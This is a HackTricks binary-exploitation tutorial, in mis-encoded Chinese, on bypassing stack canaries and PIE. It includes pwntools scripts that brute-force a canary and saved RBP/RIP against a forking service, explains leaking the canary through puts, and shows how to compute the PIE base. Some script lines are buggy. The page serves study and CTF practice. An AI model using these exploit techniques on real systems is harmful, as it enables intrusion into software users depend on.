<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


**å¦‚æœä½ é¢å¯¹çš„æ˜¯ä¸€ä¸ªå—åˆ°å †æ ˆä¿æŠ¤ï¼ˆcanaryï¼‰å’Œä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆPIEï¼‰ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯èƒ½éœ€è¦æ‰¾åˆ°ä¸€ç§ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ã€‚**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„ï¼Œå¹¶ä¸”æ— æ³•è¯†åˆ«å‡½æ•°ï¼Œé‚£ä¹ˆ **`checksec`** å¯èƒ½æ— æ³•å‘ç°äºŒè¿›åˆ¶æ–‡ä»¶å—åˆ°å †æ ˆä¿æŠ¤çš„ä¿æŠ¤ã€‚\
ç„¶è€Œï¼Œä½ å¯ä»¥æ‰‹åŠ¨æ³¨æ„åˆ°è¿™ä¸€ç‚¹ï¼Œå¦‚æœä½ å‘ç°åœ¨å‡½æ•°è°ƒç”¨çš„å¼€å§‹å¤„å°†ä¸€ä¸ªå€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå¹¶ä¸”åœ¨é€€å‡ºä¹‹å‰æ£€æŸ¥è¯¥å€¼ã€‚
{% endhint %}

# æš´åŠ›ç ´è§£ Canary

ç»•è¿‡ç®€å•çš„å †æ ˆä¿æŠ¤ï¼ˆcanaryï¼‰çš„æœ€ä½³æ–¹æ³•æ˜¯ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸€ä¸ª**æ¯æ¬¡ä½ ä¸å…¶å»ºç«‹æ–°è¿æ¥æ—¶éƒ½ä¼šæ´¾ç”Ÿå­è¿›ç¨‹çš„ç¨‹åº**ï¼ˆç½‘ç»œæœåŠ¡ï¼‰ï¼Œå› ä¸ºæ¯æ¬¡è¿æ¥åˆ°å®ƒæ—¶**éƒ½ä¼šä½¿ç”¨ç›¸åŒçš„å †æ ˆä¿æŠ¤ï¼ˆcanaryï¼‰**ã€‚

ç„¶åï¼Œç»•è¿‡å †æ ˆä¿æŠ¤ï¼ˆcanaryï¼‰çš„æœ€ä½³æ–¹æ³•å°±æ˜¯**é€ä¸ªå­—ç¬¦åœ°æš´åŠ›ç ´è§£**ï¼Œä½ å¯ä»¥é€šè¿‡æ£€æŸ¥ç¨‹åºæ˜¯å¦å´©æºƒæˆ–ç»§ç»­å…¶æ­£å¸¸æµç¨‹æ¥åˆ¤æ–­çŒœæµ‹çš„å †æ ˆä¿æŠ¤ï¼ˆcanaryï¼‰å­—èŠ‚æ˜¯å¦æ­£ç¡®ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‡½æ•°**æš´åŠ›ç ´è§£ä¸€ä¸ª 8 å­—èŠ‚çš„å †æ ˆä¿æŠ¤ï¼ˆcanaryï¼‰ï¼ˆx64ï¼‰**ï¼Œå¹¶é€šè¿‡æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å‘é€äº†**å“åº”**ï¼ˆåœ¨**å…¶ä»–æƒ…å†µ**ä¸‹å¯ä»¥ä½¿ç”¨**try/except**ï¼‰æ¥åŒºåˆ†æ­£ç¡®çŒœæµ‹çš„å­—èŠ‚å’Œé”™è¯¯çš„å­—èŠ‚ï¼š

## ç¤ºä¾‹ 1

è¿™ä¸ªç¤ºä¾‹æ˜¯ä¸º 64 ä½å®ç°çš„ï¼Œä½†å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¸º 32 ä½å®ç°ã€‚
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## ç¤ºä¾‹2

è¿™æ˜¯ä¸º32ä½å®ç°çš„ï¼Œä½†æ˜¯å¾ˆå®¹æ˜“æ”¹ä¸º64ä½ã€‚\
è¿˜è¦æ³¨æ„ï¼Œå¯¹äºè¿™ä¸ªç¤ºä¾‹ï¼Œ**ç¨‹åºé¦–å…ˆæœŸæœ›ä¸€ä¸ªå­—èŠ‚æ¥æŒ‡ç¤ºè¾“å…¥çš„å¤§å°**å’Œæœ‰æ•ˆè½½è·ã€‚
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# æ‰“å° Canary

ç»•è¿‡ Canary çš„å¦ä¸€ç§æ–¹æ³•æ˜¯**æ‰“å°å®ƒ**ã€‚\
æƒ³è±¡ä¸€ç§æƒ…å†µï¼Œä¸€ä¸ª**æ˜“å—æ ˆæº¢å‡ºæ”»å‡»çš„ç¨‹åº**å¯ä»¥æ‰§è¡Œä¸€ä¸ªæŒ‡å‘**æ ˆæº¢å‡ºéƒ¨åˆ†**çš„ **puts** å‡½æ•°ã€‚æ”»å‡»è€…çŸ¥é“**canary çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ç©ºå­—èŠ‚**(`\x00`)ï¼Œå…¶ä½™çš„å­—èŠ‚æ˜¯**éšæœº**çš„ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæº¢å‡ºï¼Œ**è¦†ç›–æ ˆç›´åˆ° canary çš„ç¬¬ä¸€ä¸ªå­—èŠ‚**ã€‚\
ç„¶åï¼Œæ”»å‡»è€…åœ¨è´Ÿè½½çš„ä¸­é—´**è°ƒç”¨ puts åŠŸèƒ½**ï¼Œè¿™å°†**æ‰“å°å‡ºæ‰€æœ‰çš„ canary**ï¼ˆé™¤äº†ç¬¬ä¸€ä¸ªç©ºå­—èŠ‚ï¼‰ã€‚\
æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæ”»å‡»è€…å¯ä»¥**æ„é€ å¹¶å‘é€ä¸€ä¸ªæ–°çš„æ”»å‡»**ï¼ŒçŸ¥é“äº† canaryï¼ˆåœ¨åŒä¸€ä¸ªç¨‹åºä¼šè¯ä¸­ï¼‰ã€‚

æ˜¾ç„¶ï¼Œè¿™ç§ç­–ç•¥éå¸¸**å—é™**ï¼Œå› ä¸ºæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿ**æ‰“å°**ä»–çš„**è´Ÿè½½**çš„**å†…å®¹**ï¼Œä»¥**æ³„éœ²**å‡º**canary**ï¼Œç„¶åèƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„è´Ÿè½½ï¼ˆåœ¨**åŒä¸€ä¸ªç¨‹åºä¼šè¯**ä¸­ï¼‰å¹¶**å‘é€**çœŸæ­£çš„ç¼“å†²åŒºæº¢å‡ºã€‚\
CTF ç¤ºä¾‹ï¼š[https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

ä¸ºäº†ç»•è¿‡ PIEï¼Œä½ éœ€è¦**æ³„éœ²ä¸€äº›åœ°å€**ã€‚å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰æ³„éœ²ä»»ä½•åœ°å€ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯åœ¨æ˜“å—æ”»å‡»çš„å‡½æ•°ä¸­**æš´åŠ›ç ´è§£æ ˆä¸­ä¿å­˜çš„ RBP å’Œ RIP**ã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒæ—¶ä½¿ç”¨äº†**canary**å’Œ**PIE**è¿›è¡Œä¿æŠ¤ï¼Œä½ å¯ä»¥å¼€å§‹æš´åŠ›ç ´è§£ canaryï¼Œç„¶å**æ¥ä¸‹æ¥çš„**8ä¸ªå­—èŠ‚ï¼ˆx64ï¼‰å°†æ˜¯ä¿å­˜çš„**RBP**ï¼Œå†æ¥ä¸‹æ¥çš„8ä¸ªå­—èŠ‚å°†æ˜¯ä¿å­˜çš„**RIP**ã€‚

è¦ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æš´åŠ›ç ´è§£ RBP å’Œ RIPï¼Œä½ å¯ä»¥å‘ç°ï¼Œå¦‚æœç¨‹åºè¾“å‡ºäº†ä¸€äº›å†…å®¹æˆ–è€…æ²¡æœ‰å´©æºƒï¼Œé‚£ä¹ˆä¸€ä¸ªæœ‰æ•ˆçš„çŒœæµ‹å­—èŠ‚å°±æ˜¯æ­£ç¡®çš„ã€‚ä¸ç”¨äºæš´åŠ›ç ´è§£ canary çš„ç›¸åŒå‡½æ•°å¯ä»¥ç”¨äºæš´åŠ›ç ´è§£ RBP å’Œ RIPï¼š
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## è·å–åŸºåœ°å€

æ‰“è´¥PIEçš„æœ€åä¸€æ­¥æ˜¯ä»æ³„æ¼çš„åœ°å€ä¸­è®¡ç®—å‡ºæœ‰ç”¨çš„åœ°å€ï¼š**RBP**å’Œ**RIP**ã€‚

é€šè¿‡**RBP**ï¼Œæ‚¨å¯ä»¥è®¡ç®—å‡ºæ‚¨åœ¨å †æ ˆä¸­ç¼–å†™shellçš„ä½ç½®ã€‚è¿™å¯¹äºçŸ¥é“æ‚¨å°†åœ¨å †æ ˆä¸­ç¼–å†™å­—ç¬¦ä¸²_"/bin/sh\x00"_çš„ä½ç½®éå¸¸æœ‰ç”¨ã€‚è¦è®¡ç®—æ³„æ¼çš„RBPå’Œæ‚¨çš„shellcodeä¹‹é—´çš„è·ç¦»ï¼Œæ‚¨åªéœ€åœ¨æ³„æ¼RBPä¹‹åè®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åæ£€æŸ¥æ‚¨çš„shellcodeä½äºä½•å¤„ï¼Œç„¶åå¯ä»¥è®¡ç®—shellcodeä¸RBPä¹‹é—´çš„è·ç¦»ï¼š
```python
INI_SHELLCODE = RBP - 1152
```
ä»**RIP**ä¸­ï¼Œæ‚¨å¯ä»¥è®¡ç®—**PIEäºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºåœ°å€**ï¼Œè¿™æ˜¯æ‚¨éœ€è¦åˆ›å»º**æœ‰æ•ˆçš„ROPé“¾**æ‰€éœ€çš„å†…å®¹ã€‚\
è¦è®¡ç®—åŸºåœ°å€ï¼Œåªéœ€æ‰§è¡Œ`objdump -d vunbinary`å¹¶æ£€æŸ¥åæ±‡ç¼–çš„æœ€æ–°åœ°å€ï¼š

![](<../../.gitbook/assets/image (145).png>)

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°åªéœ€è¦**1ä¸ªå­—èŠ‚å’ŒåŠä¸ªå­—èŠ‚**å°±å¯ä»¥å®šä½æ‰€æœ‰çš„ä»£ç ï¼Œç„¶åï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸºåœ°å€å°†æ˜¯**æ³„æ¼çš„RIPï¼Œä½†ä»¥"000"ç»“å°¾**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ³„æ¼çš„æ˜¯_0x562002970**ecf**_ï¼Œåˆ™åŸºåœ°å€ä¸º_0x562002970**000**_ã€‚
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
